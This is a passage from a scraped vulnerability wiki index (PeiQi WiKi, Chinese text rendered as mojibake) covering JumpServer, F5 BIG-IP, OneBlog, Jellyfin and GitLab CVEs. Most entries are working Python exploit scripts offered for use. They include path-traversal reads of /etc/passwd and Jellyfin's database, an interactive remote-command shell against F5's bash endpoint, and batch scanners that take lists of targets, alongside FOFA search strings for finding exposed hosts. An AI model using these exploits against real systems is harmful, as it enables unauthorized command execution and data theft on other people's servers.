‡æ¼æ´å·²ä¿®å¤ï¼Œæ— æ³•è·å–æ•æ„Ÿæ—¥å¿—ä¿¡æ¯,{}\\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, user, asset, system_user): if target_url == \"\" or asset == \"\" or system_user == \"\": print(\"\\033[31m[x] è¯·è·å– assset ç­‰å‚æ•°é…ç½®\\033[0m\") sys.exit(0) data = {\"user\": user, \"asset\": asset, \"system_user\": system_user} vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try: response = requests.post(vuln_url, json=data, timeout=5).json() print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ï¼š{}\\033[0m\".format(vuln_url)) token = response['token'] print(\"\\033[36m[o] æˆåŠŸè·å–Tokenï¼š{}\\033[0m\".format(token)) ws_url = target_url.strip(\"http://\") ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id={}\".format(token) asyncio.get_event_loop().run_until_complete(main_logic(ws_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ£€æŸ¥ assset ç­‰å‚æ•°é…ç½®,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) user = \"ed3460eb-3c70-4beb-b631-f8f91c39bdd1\" asset = \"37fce0b0-cc4f-4822-8c33-afdebc888fa7\" system_user = \"da09ddd7-fd3f-46c3-914d-752883a4d950\" POC_1(target_url) POC_2(target_url, user, asset, system_user) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/","title":"F5 BIG-IP","keywords":"","body":"F5 BIG-IP F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902 F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-22986 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-20 10:21:34 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902.html","title":"F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902","keywords":"","body":"F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902 æ¼æ´æè¿° 2020å¹´07æœˆ03æ—¥ï¼Œ 360CERTç›‘æµ‹å‘ç° F5 å‘å¸ƒäº† F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œ çš„é£é™©é€šå‘Šï¼Œè¯¥æ¼æ´ç¼–å·ä¸º CVE-2020-5902ï¼Œæ¼æ´ç­‰çº§ï¼šä¸¥é‡ã€‚ æœªæˆæƒçš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘æ¼æ´é¡µé¢å‘é€ç‰¹åˆ¶çš„è¯·æ±‚åŒ…ï¼Œå¯ä»¥é€ æˆä»»æ„ Java ä»£ç æ‰§è¡Œã€‚è¿›è€Œæ§åˆ¶ F5 BIG-IP çš„å…¨éƒ¨åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº: æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€å¼€å¯/ç¦ç”¨æœåŠ¡ã€åˆ›å»º/åˆ é™¤æœåŠ¡å™¨ç«¯æ–‡ä»¶ç­‰ã€‚è¯¥æ¼æ´å½±å“æ§åˆ¶é¢æ¿å—å½±å“ï¼Œä¸å½±å“æ•°æ®é¢æ¿ã€‚ æ¼æ´å½±å“ [!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] title=\"BIG-IP&reg ;- Redirect\" æ¼æ´å¤ç° åœ¨ tmshCmd çš„ serviceæ–¹æ³•å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œæœªå¯¹command å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç›´æ¥è°ƒç”¨ WorkspaceUtils.runTmshCommand(cmd, request); æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé™åˆ¶äº†æ‰§è¡Œdelete,create,list,modifyã€‚ if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = new String[]{command}; Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (CallException var11) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage()); error = var11.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } åœ¨ fileRead çš„ serviceæ–¹æ³•å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œæœªå¯¹ fileName å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç›´æ¥è°ƒç”¨ WorkspaceUtils.readFile(fileName); æ–¹æ³•ï¼Œè¿›è¡Œæ–‡ä»¶è¯»å–ã€‚ åœ¨ fileSave çš„ serviceæ–¹æ³•å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œæœªå¯¹ fileNameï¼Œcontent å‚æ•°è¿›è¡Œå¤„ç†ï¼Œç›´æ¥è°ƒç”¨ WorkspaceUtils.saveFile(request); æ–¹æ³•ï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚ è¯¦æƒ…åˆ©ç”¨æ–¹å¼ https://github.com/jas502n/CVE-2020-5902 è¯¦æƒ…åˆ©ç”¨æ–¹å¼ https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md è¯»å–æ–‡ä»¶ http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd å†™å…¥æ–‡ä»¶ http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/test.txt&content=test è¯»å–æ–‡ä»¶ /tmp/test æˆåŠŸå†™å…¥æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-5902.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Language\":\"zh-CN,zh;q=0.9\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=version_url, timeout=10, verify=False, headers=headers) if \"output\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸º:\\n{}\\033[0m\".format(target_url, json.loads(response.text)[\"output\"])) else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ \\033[0m\") except Exception as e: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´æ— æ³•åˆ©ç”¨ ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) å‚è€ƒæ–‡ç«  https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:14:56 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-22986.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/F5 BIG-IP/F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-22986.html","title":"F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-22986","keywords":"","body":"F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-22986 æ¼æ´æè¿° F5 BIG-IP æ˜¯ç¾å›½ F5 å…¬å¸çš„ä¸€æ¬¾é›†æˆäº†ç½‘ç»œæµé‡ç®¡ç†ã€åº”ç”¨ç¨‹åºå®‰å…¨ç®¡ç†ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½çš„åº”ç”¨äº¤ä»˜å¹³å°ã€‚ è¿‘æ—¥ï¼ŒF5å‘å¸ƒäº†F5 BIG-IQ/F5 BIG-IP ä»£ç æ‰§è¡Œï¼Œä»£ç æ‰§è¡Œçš„é£é™©å£°æ˜ï¼ŒF5å®‰å…¨å…¬å‘Šæ›´æ–°äº†BIG-IPï¼ŒBIG-IQä¸­çš„å¤šä¸ªä¸¥é‡æ¼æ´ã€‚å»ºè®®å¹¿å¤§ç”¨æˆ·åŠæ—¶å°†f5 big-iq,f5 big-ipå‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œé¿å…é­åˆ°æ”»å‡»ã€‚ æ¼æ´å½±å“ [!NOTE] F5 BIG-IP 16.x: 16.1.0.3 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] icon_hash=\"-335242539\" æ¼æ´å¤ç° è®¿é—®ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ… POST /mgmt/tm/util/bash HTTP/1.1 Host: xxx.xxx.xxx.xxx:8443 Connection: close Content-Length: 41 Cache-Control: max-age=0 Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Upgrade-Insecure-Requests: 1 Content-Type: application/json {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} æˆåŠŸæ‰§è¡Œå‘½ä»¤ id æ¼æ´åˆ©ç”¨POC æ‰¹é‡æµ‹è¯• import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2) if \"commandResult\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,å“åº”ä¸º:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"https://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) å‘½ä»¤æ‰§è¡Œ import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '''{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}''' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´,å“åº”ä¸º:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) while True: Cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, Cmd) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url), e) def POC_2(target_url, Cmd): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } Cmd = \"'\" + Cmd + \"'\" data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}' % Cmd try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[32m{} \\033[0m\".format(json.loads(response.text)[\"commandResult\"])) except Exception as e: print(\"\\033[31m[x] å‘½ä»¤æ‰§è¡Œå¤±è´¥ \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/OneBlog/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/OneBlog/","title":"OneBlog","keywords":"","body":"OneBlog OneBlog PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-09 01:37:50 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/OneBlog/OneBlog å°äºv2.2.1 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/OneBlog/OneBlog å°äºv2.2.1 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"OneBlog å°äºv2.2.1 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"OneBlog å°äºv2.2.1 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° OneBlog å°äºv2.2.1 ç”±äºä½¿ç”¨å«æœ‰æ¼æ´ç‰ˆæœ¬çš„Apache Shiroå’Œé»˜è®¤çš„å¯†é’¥å¯¼è‡´å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´å½±å“ [!NOTE] OneBlog FOFA [!NOTE] app=\"OneBlogå¼€æºåšå®¢åå°ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»é™†é¡µé¢å¦‚ä¸‹ ä½¿ç”¨å·¥å…·ç›´æ¥åˆ©ç”¨Apache Shiroæ¼æ´å³å¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jellyfin/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jellyfin/","title":"Jellyfin","keywords":"","body":"Jellyfin Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-07 22:22:15 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jellyfin/Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jellyfin/Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402.html","title":"Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402","keywords":"","body":"Jellyfin ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2021-21402 æ¼æ´æè¿° Jellyfinæ˜¯ä¸€ä¸ªå…è´¹è½¯ä»¶åª’ä½“ç³»ç»Ÿã€‚åœ¨10.7.1ç‰ˆä¹‹å‰çš„Jellyfinä¸­ï¼Œå¸¦æœ‰æŸäº›ç»ˆç»“ç‚¹çš„ç²¾å¿ƒè®¾è®¡çš„è¯·æ±‚å°†å…è®¸ä»JellyfinæœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–ä»»æ„æ–‡ä»¶ã€‚å½“Windowsç”¨ä½œä¸»æœºOSæ—¶ï¼Œæ­¤é—®é¢˜æ›´ä¸ºæ™®éã€‚æš´éœ²äºå…¬å…±Internetçš„æœåŠ¡å™¨å¯èƒ½ä¼šå—åˆ°å¨èƒã€‚åœ¨ç‰ˆæœ¬10.7.1ä¸­å·²ä¿®å¤æ­¤é—®é¢˜ã€‚è§£å†³æ–¹æ³•æ˜¯ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šå®æ–½ä¸¥æ ¼çš„å®‰å…¨æƒé™æ¥é™åˆ¶æŸäº›è®¿é—®ï¼Œä½†æ˜¯å»ºè®®å°½å¿«è¿›è¡Œæ›´æ–°ã€‚ æ¼æ´å½±å“ [!NOTE] Jellyfin FOFA [!NOTE] title='Jellyfin' || body='http://jellyfin.media' æ¼æ´å¤ç° æ— è®ºæ˜¯/Audio/{Id}/hls/{segmentId}/stream.mp3å’Œ/Audio/{Id}/hls/{segmentId}/stream.aacè·¯çº¿å…è®¸ä»»æ„æ–‡ä»¶åœ¨Windowsä¸Šè¯»å–ã€‚å¯ä»¥{segmentId}ä½¿ç”¨Windowsè·¯å¾„åˆ†éš”ç¬¦\\ï¼ˆå¯¹%5CURLè¿›è¡Œç¼–ç ï¼‰å°†è·¯ç”±çš„ä¸€éƒ¨åˆ†è®¾ç½®ä¸ºç›¸å¯¹æˆ–ç»å¯¹è·¯å¾„ã€‚æœ€åˆï¼Œæ”»å‡»è€…ä¼¼ä¹åªèƒ½è¯»å–ä»¥.mp3å’Œ.aacç»“å°¾çš„æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œé€šè¿‡åœ¨URLè·¯å¾„ä¸­ä½¿ç”¨æ–œæ  Path.GetExtension(Request.Path)è¿”å›ä¸€ä¸ªç©ºæ‰©å±•åï¼Œä»è€Œè·å¾—å¯¹ç»“æœæ–‡ä»¶è·¯å¾„çš„å®Œå…¨æ§åˆ¶ã€‚çš„itemIdï¼Œå› ä¸ºå®ƒæ²¡æœ‰ä½¿ç”¨ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚è¯¥é—®é¢˜ä¸ä»…é™äºJellyfinæ–‡ä»¶ï¼Œå› ä¸ºå®ƒå…è®¸ä»æ–‡ä»¶ç³»ç»Ÿè¯»å–ä»»ä½•æ–‡ä»¶ã€‚ // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.mp3\", Name = \"GetHlsAudioSegmentLegacyMp3\")] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.aac\", Name = \"GetHlsAudioSegmentLegacyAac\")] //... public ActionResult GetHlsAudioSegmentLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string segmentId) { // TODO: Deprecate with new iOS app var file = segmentId + Path.GetExtension(Request.Path); //[2] file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file); return FileStreamResponseHelpers.GetStaticFileResult(file, MimeTypes.GetMimeType(file)!, false, HttpContext); } ä½¿ç”¨å¦‚ä¸‹è¯·æ±‚å°†ä¼šè¯»å–å¸¦æœ‰å¯†ç çš„æ•°æ®åº“æ–‡ä»¶ http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ å¦ä¸€å¤„ä»£ç å¦‚ä¸‹ // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [HttpGet(\"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\")] //... public ActionResult GetHlsVideoSegmentLegacy( [FromRoute, Required] string itemId, [FromRoute, Required] string playlistId, [FromRoute, Required] string segmentId, [FromRoute, Required] string segmentContainer) { var file = segmentId + Path.GetExtension(Request.Path); //[2] var transcodeFolderPath = _serverConfigurationManager.GetTranscodePath(); file = Path.Combine(transcodeFolderPath, file); //[3] var normalizedPlaylistId = playlistId; var filePaths = _fileSystem.GetFilePaths(transcodeFolderPath); // Add . to start of segment container for future use. segmentContainer = segmentContainer.Insert(0, \".\"); string? playlistPath = null; foreach (var path in filePaths) { var pathExtension = Path.GetExtension(path); if ((string.Equals(pathExtension, segmentContainer, StringComparison.OrdinalIgnoreCase) || string.Equals(pathExtension, \".m3u8\", StringComparison.OrdinalIgnoreCase)) //[4] && path.IndexOf(normalizedPlaylistId, StringComparison.OrdinalIgnoreCase) != -1) //[5] { playlistPath = path; break; } } return playlistPath == null ? NotFound(\"Hls segment not found.\") : GetFileResult(file, playlistPath); } è¯¥/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}è·¯ç”±å…è®¸åœ¨Windowsä¸Šè¯»å–æœªç»èº«ä»½éªŒè¯çš„ä»»æ„æ–‡ä»¶ã€‚å¯ä»¥{SegmentId}.{SegmentContainer}ä½¿ç”¨Windowsè·¯å¾„åˆ†éš”ç¬¦\\ï¼ˆå¯¹%5CURLè¿›è¡Œç¼–ç ï¼‰å°†è·¯ç”±çš„ä¸€éƒ¨åˆ†è®¾ç½®ä¸ºç›¸å¯¹æˆ–ç»å¯¹è·¯å¾„ã€‚åœ¨SegmentIdä»å’Œæ–‡ä»¶æ‰©å±•åPathè¢«çº§è”ã€‚ç»“æœfileç”¨ä½œPath.Combine[3]çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚ä½†æ˜¯ï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯ç»å¯¹è·¯å¾„ï¼Œåˆ™ç¬¬ä¸€ä¸ªå‚æ•°toå°†Path.Combineè¢«å¿½ç•¥ï¼Œè€Œå¾—åˆ°çš„è·¯å¾„ä»…æ˜¯ç»å¯¹è·¯å¾„fileã€‚ POCå¦‚ä¸‹ï¼Œä¸‹è½½åŒæ ·çš„æ–‡ä»¶ http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db å¦‚ä¸Šä¸ºè¯æ˜æ¼æ´å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œè¯¦æƒ…é“¾æ¥å‚è€ƒ https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ æ¼æ´POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Jellyfin >> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and \"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´(è¯»å– windows/win.ini), é“¾æ¥ä¸º:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚æŠ¥é”™ \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/GitLab/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/GitLab/","title":"GitLab","keywords":"","body":"GitLab GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413 GitLab SSRFæ¼æ´ CVE-2021-22214 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-27 22:11:30 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/GitLab/GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/GitLab/GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413.html","title":"GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413","keywords":"","body":"GitLab Graphqlé‚®ç®±ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-26413 æ¼æ´æè¿° GitLabä¸­å­˜åœ¨Graphqlæ¥å£ è¾“å…¥æ„é€ çš„æ•°æ®æ—¶ä¼šæ³„éœ²ç”¨æˆ·é‚®ç®±å’Œç”¨æˆ·å æ¼æ´å½±å“ [!NOTE] GitLab 13.4 - 13.6.2 FOFA [!NOTE] title=\"GitLab\" æ¼æ´å¤ç° æ¼æ´æ¥æºä¸º hackoneä¸Šçš„ä¸€ç¯‡å…¬å¼€æŠ¥å‘Š https://gitlab.com/gitlab-org/gitlab/-/issues/244275 æ„æ€ä¸ºå½“ä½¿ç”¨æ„é€ 